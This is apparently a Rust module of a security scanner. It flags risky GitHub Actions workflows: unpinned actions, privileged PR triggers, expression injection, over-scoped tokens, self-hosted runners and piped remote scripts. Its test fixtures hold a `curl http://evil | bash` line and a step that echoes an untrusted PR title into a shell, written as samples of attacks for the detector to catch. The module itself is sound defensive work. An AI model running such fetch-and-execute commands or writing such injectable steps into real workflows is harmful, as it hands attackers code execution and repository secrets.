//! GitHub Actions workflow risk analysis — a static read of
//! `.github/workflows/*.yml`, the surface source-only SCA tools miss.
//!
//! Line/file-level heuristics (no YAML parse, so malformed or templated
//! workflows don't break it) for the patterns behind the CI supply-chain
//! incidents:
//!
//! - **mutable action refs** — `uses: x@main` / an un-SHA-pinned third-party
//!   action (tj-actions repointed mutable tags: CVE-2025-30066);
//! - **poisoned-pipeline triggers** — `pull_request_target` / `workflow_run`,
//!   worse when they check out the untrusted PR head (the PPE class);
//! - **expression injection** — attacker-controllable `${{ github.event.* }}`
//!   interpolated into a shell step;
//! - **over-scoped token** — `permissions: write-all`;
//! - **self-hosted runners** — untrusted code inside your network;
//! - **`curl … | sh`** — the Codecov uploader pattern.

use std::path::Path;

use crate::analyze::util;
use crate::model::{Category, Finding, Severity};

/// Attacker-controllable event fields that cause shell injection when
/// interpolated into a `run:` step (safe fields like `.number` are excluded).
const INJECTABLE: &[&str] = &[
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.head_ref",
];

/// Is this path a workflow file (`…/.github/workflows/*.yml|yaml`)?
/// Components are compared in place (ASCII case-insensitive): this runs on
/// every YAML file in the tree, `node_modules` included, and collecting them
/// as lowercased `String`s cost an allocation per component.
fn is_workflow(path: &Path) -> bool {
    let mut prev_github = false;
    path.components().any(|c| {
        let c = c.as_os_str();
        let hit = prev_github && c.eq_ignore_ascii_case("workflows");
        prev_github = c.eq_ignore_ascii_case(".github");
        hit
    })
}

pub fn scan_dir(list: &util::Listing, out: &mut Vec<Finding>) {
    for path in list.files(list.root(), &["yml", "yaml"]) {
        if !is_workflow(&path) {
            continue;
        }
        let Some(text) = super::read_lossy(&path) else {
            continue;
        };
        let name = path
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("workflow")
            .to_string();
        let mk = |severity: Severity, detail: String| Finding {
            dependency: name.clone(),
            severity,
            category: Category::SensitiveApi,
            detail,
            location: Some(path.display().to_string()),
            evidence: None,
            enrich_url: None,
        };

        // File-level: dangerous trigger, worse with an untrusted checkout.
        // Code only: n8n names `workflow_run` in a comment of a workflow that
        // runs on `pull_request_review`.
        let risky_trigger = text.lines().any(|l| {
            let code = l.split(" #").next().unwrap_or(l);
            !code.trim_start().starts_with('#')
                && (code.contains("pull_request_target") || code.contains("workflow_run"))
        });
        let exec = exec_lines(&text);
        let untrusted_checkout = untrusted_checkout(&text, &exec);
        if risky_trigger && untrusted_checkout {
            out.push(mk(Severity::High,
                "`pull_request_target`/`workflow_run` checks out untrusted PR code and runs it with repo secrets (poisoned-pipeline execution)".into()));
        } else if risky_trigger {
            out.push(mk(Severity::Medium,
                "`pull_request_target`/`workflow_run` runs in a privileged context — audit for untrusted-code execution".into()));
        }

        // File-level: expression injection into a shell step.
        if let Some(inj) = INJECTABLE
            .iter()
            .find(|i| exec.iter().any(|l| l.contains(**i)))
        {
            out.push(mk(Severity::High,
                format!("untrusted `${{{{ {inj} }}}}` may be interpolated into a `run:` step (expression injection)")));
        }

        // File-level: over-scoped token.
        if text.contains("write-all") {
            out.push(mk(
                Severity::Medium,
                "`permissions: write-all` — the GITHUB_TOKEN is over-scoped for the whole workflow"
                    .into(),
            ));
        }

        // Line-level checks.
        for line in text.lines() {
            let l = line.trim();
            if let Some(spec) = l
                .strip_prefix("- uses:")
                .or_else(|| l.strip_prefix("uses:"))
                && let Some((action, severity, why)) = uses_risk(spec.trim())
            {
                out.push(mk(severity, format!("action `{action}` {why}")));
            }
            if l.starts_with("runs-on:") && line.contains("self-hosted") {
                out.push(mk(
                    Severity::Medium,
                    "`runs-on: self-hosted` — untrusted workflow code runs inside your network"
                        .into(),
                ));
            }
            if (line.contains("curl ") || line.contains("wget "))
                && (line.contains("| sh")
                    || line.contains("|sh")
                    || line.contains("| bash")
                    || line.contains("|bash"))
            {
                out.push(mk(Severity::High,
                    "pipes a remote script straight to a shell (`curl … | sh`) — the Codecov pattern".into()));
            }
        }
    }
}

/// Lines whose text is executed: the value of a `run:` step, or the `script:`
/// of `actions/github-script`, inline or as a `|`/`>` block. An expression in
/// `env:`, `if:`, `with:` or `concurrency:` is not interpolated into a shell —
/// moving it to `env:` is the very fix for expression injection.
fn exec_lines(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    // Indent of the key that opened the current block scalar.
    let mut block: Option<usize> = None;
    for line in text.lines() {
        let indent = line.len() - line.trim_start().len();
        if let Some(i) = block {
            if line.trim().is_empty() || indent > i {
                out.push(line);
                continue;
            }
            block = None;
        }
        let key = line.trim_start().trim_start_matches("- ");
        let Some(value) = key
            .strip_prefix("run:")
            .or_else(|| key.strip_prefix("script:"))
        else {
            continue;
        };
        let value = value.trim();
        if value.starts_with(['|', '>']) {
            // The key's own indent: `- run: |` nests its body under the `-`.
            block = Some(indent);
        } else {
            out.push(value);
        }
    }
    out
}

/// Does the workflow check out (or fetch) the PR head? Only a checkout `ref:` /
/// `repository:` or a shell fetch counts — `head_ref` in a `concurrency.group`
/// or an `env:` does not run anything.
fn untrusted_checkout(text: &str, exec: &[&str]) -> bool {
    const HEAD: &[&str] = &["head.ref", "head.sha", "head_ref", "head.repo", "refs/pull/", "merge_commit_sha"];
    let checkout_key = text.lines().any(|l| {
        let k = l.trim_start().trim_start_matches("- ");
        (k.starts_with("ref:") || k.starts_with("repository:")) && HEAD.iter().any(|h| k.contains(h))
    });
    checkout_key
        || exec.iter().any(|l| {
            l.contains("gh pr checkout") || (l.contains("git fetch") && l.contains("pull/"))
        })
}

/// Classify a `uses:` action reference. `None` when it's SHA-pinned, local
/// (`./`) or a docker image — the safe forms.
fn uses_risk(spec: &str) -> Option<(String, Severity, &'static str)> {
    let spec = spec
        .split('#')
        .next()
        .unwrap_or(spec)
        .trim()
        .trim_matches(|c| c == '"' || c == '\'');
    if spec.starts_with("./") || spec.starts_with("docker://") {
        return None;
    }
    let (action, reference) = spec.split_once('@')?;
    if is_sha(reference) {
        return None; // commit-SHA pinned — the recommended form
    }
    let owner = action.split('/').next().unwrap_or("");
    let branchy = matches!(
        reference,
        "main" | "master" | "develop" | "dev" | "latest" | "head" | "HEAD"
    );
    if branchy {
        Some((
            action.into(),
            Severity::Medium,
            "is pinned to a mutable branch — trivially repointed (the tj-actions vector); pin a commit SHA",
        ))
    } else if !matches!(owner, "actions" | "github") {
        Some((
            action.into(),
            Severity::Low,
            "is a third-party action not pinned to a commit SHA (a tag is repointable)",
        ))
    } else {
        None // an official action on a version tag — common, low risk
    }
}

fn is_sha(r: &str) -> bool {
    r.len() == 40 && r.bytes().all(|b| b.is_ascii_hexdigit())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn flags_workflow_risks_but_not_clean() {
        let tmp = std::env::temp_dir().join(format!("pm-gha-{}", std::process::id()));
        let _ = fs::remove_dir_all(&tmp);
        fs::create_dir_all(tmp.join(".github/workflows")).unwrap();
        fs::write(tmp.join(".github/workflows/risky.yml"),
            "on: pull_request_target\njobs:\n  x:\n    runs-on: self-hosted\n    steps:\n      - uses: tj-actions/changed-files@main\n      - run: echo ${{ github.event.pull_request.title }}\n      - run: curl http://evil | bash\n").unwrap();
        // A clean workflow: SHA-pinned official action, plain push trigger.
        fs::write(tmp.join(".github/workflows/clean.yml"),
            "on: push\njobs:\n  y:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n").unwrap();

        let mut out = Vec::new();
        scan_dir(&util::Listing::walk(&tmp), &mut out);
        let has = |s: &str| out.iter().any(|f| f.detail.contains(s));
        assert!(has("mutable branch"), "tj-actions@main flagged");
        assert!(has("self-hosted"));
        assert!(has("expression injection"));
        assert!(has("Codecov"));
        assert!(has("pull_request_target"));
        assert!(
            !out.iter().any(|f| f
                .location
                .as_deref()
                .is_some_and(|l| l.ends_with("clean.yml"))),
            "the SHA-pinned clean workflow is not flagged"
        );
        let _ = fs::remove_dir_all(&tmp);
    }

    #[test]
    fn expressions_outside_run_are_not_injection() {
        // n8n / strapi / zed shapes: env:, if:, concurrency, reusable `with:`,
        // and a privileged trigger that checks out a trusted branch.
        let wf = "on: pull_request_target\nconcurrency:\n  group: ${{ github.head_ref || github.ref }}\njobs:\n  x:\n    if: startsWith(github.event.comment.body, '/cla')\n    uses: ./.github/workflows/r.yml\n    with:\n      body: ${{ github.event.pull_request.body }}\n  y:\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n        with:\n          ref: master\n      - env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n        run: |\n          echo \"$PR_TITLE\"\n";
        let exec = exec_lines(wf);
        assert!(!INJECTABLE.iter().any(|i| exec.iter().any(|l| l.contains(i))), "{exec:?}");
        assert!(!untrusted_checkout(wf, &exec));

        let bad = "steps:\n  - name: x\n    run: |\n      echo start\n      echo \"${{ github.event.issue.title }}\"\n  - uses: actions/checkout@v4\n    with:\n      ref: ${{ github.event.pull_request.head.sha }}\n";
        let exec = exec_lines(bad);
        let mut out = Vec::new();
        let tmp = std::env::temp_dir().join(format!("pm-gha-c-{}", std::process::id()));
        fs::create_dir_all(tmp.join(".github/workflows")).unwrap();
        fs::write(tmp.join(".github/workflows/r.yml"),
            "# workflow_run listens to this one\non:\n  pull_request_review:\n").unwrap();
        scan_dir(&util::Listing::walk(&tmp), &mut out);
        let _ = fs::remove_dir_all(&tmp);
        assert!(out.is_empty(), "a trigger named in a comment is not a trigger: {out:?}");
        assert!(exec.iter().any(|l| l.contains("issue.title")));
        assert!(untrusted_checkout(bad, &exec));
    }
}
